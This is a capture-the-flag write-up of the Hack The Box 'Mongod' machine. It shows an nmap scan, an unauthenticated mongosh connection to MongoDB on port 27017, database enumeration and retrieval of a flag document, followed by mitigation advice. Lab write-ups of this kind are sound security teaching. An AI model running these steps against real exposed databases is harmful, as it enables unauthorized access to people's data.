# Mongod — HTB Walkthrough

**Status:** Completed  
**Difficulty:** Very Easy  
**OS:** Linux

## TL;DR
Discover MongoDB database server, connect using mongosh without authentication, enumerate databases and collections, retrieve flag from document.

## Target / Access
**Target IP:** `<redacted>`  
> Note: IP addresses have been redacted per HTB publishing guidelines.

---

## Enumeration

### Step 1: Port Scanning with Nmap

**Command:**
```bash
nmap -sV -p- <redacted-ip>
```

**Raw Log:** [nmap-scan.txt](raw-logs/document.pdf) (Pages 2-3)

**Output Excerpt:**
```
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8
```

**Analysis:** MongoDB database service running on default port 27017.

![Nmap scan](images/page-2-img-1.png)

![Port scan results](images/page-2-img-2.png)

![Service detected](images/page-2-render.png)

![MongoDB version](images/page-3-img-1.png)

![Scan complete](images/page-3-render.png)

---

## Foothold / Initial Access

### Step 2: MongoDB Connection

**Command:**
```bash
mongosh mongodb://<redacted-ip>:27017
```

**Raw Log:** [mongo-connection.txt](raw-logs/document.pdf) (Pages 4-5)

**Output:**
```
Connecting to: mongodb://<redacted-ip>:27017/
Using MongoDB: 3.6.8
>
```

**Analysis:** Successfully connected to MongoDB without authentication.

![Mongosh installation](images/page-4-img-1.png)

![Connection command](images/page-4-img-2.png)

![Connection successful](images/page-4-render.png)

![MongoDB prompt](images/page-5-img-1.png)

![Ready to enumerate](images/page-5-render.png)

### Step 3: Database Enumeration

**Commands:**
```bash
> show dbs
> use sensitive_information
> show collections
```

**Raw Log:** [mongo-enumeration.txt](raw-logs/document.pdf) (Pages 6-7)

**Output Excerpt:**
```
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB

> use sensitive_information
switched to db sensitive_information

> show collections
flag
```

**Analysis:** Database "sensitive_information" contains collection named "flag".

![Show databases](images/page-6-img-1.png)

![Database listing](images/page-6-img-2.png)

![Database enumeration](images/page-6-render.png)

![Collection found](images/page-7-img-1.png)

![Flag collection](images/page-7-render.png)

### Step 4: Flag Retrieval

**Commands:**
```bash
> db.flag.find()
> db.flag.find().pretty()
```

**Raw Log:** [flag-retrieval.txt](raw-logs/document.pdf) (Pages 8-9)

**Output:** Flag document retrieved from MongoDB collection.

![Find command](images/page-8-img-1.png)

![Document query](images/page-8-render.png)

![Flag value](images/page-9-img-1.png)

![Mission complete](images/page-9-render.png)

---

## Summary

This Starting Point machine demonstrates MongoDB database enumeration and unauthenticated access exploitation.

### Attack Chain
1. **Port Scanning** — Discovered MongoDB on port 27017
2. **Unauthenticated Connection** — Connected via mongosh without credentials
3. **Database Enumeration** — Listed databases and collections
4. **Data Extraction** — Retrieved flag document from collection

### Tools Used
- Nmap — Port scanning and service detection
- mongosh — MongoDB shell for database interaction

---

## Cleanup / Notes / References

### Mitigation Recommendations
1. **Enable Authentication:** Configure MongoDB to require username/password authentication.
2. **Bind to Localhost:** Bind MongoDB to 127.0.0.1 to prevent external access.
3. **Firewall Rules:** Restrict MongoDB access to trusted IP addresses only.
4. **Role-Based Access Control:** Implement RBAC with principle of least privilege.
5. **Enable TLS/SSL:** Encrypt MongoDB connections using TLS.
6. **Disable Wire Protocol:** Disable deprecated wire protocol features.
7. **Regular Auditing:** Enable and review MongoDB audit logs.

### References
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
- [MongoDB Authentication](https://docs.mongodb.com/manual/core/authentication/)
- [OWASP: Insufficient Authentication](https://owasp.org/www-community/Insufficient_Authentication)

---

## Security Summary

**Redactions Performed:**
- IP addresses replaced with `<redacted>` or `<redacted-ip>`
- No authentication was required (misconfiguration)

**⚠️ Warning:** Review and redact any sensitive information (credentials, private IPs, tokens) before publishing.
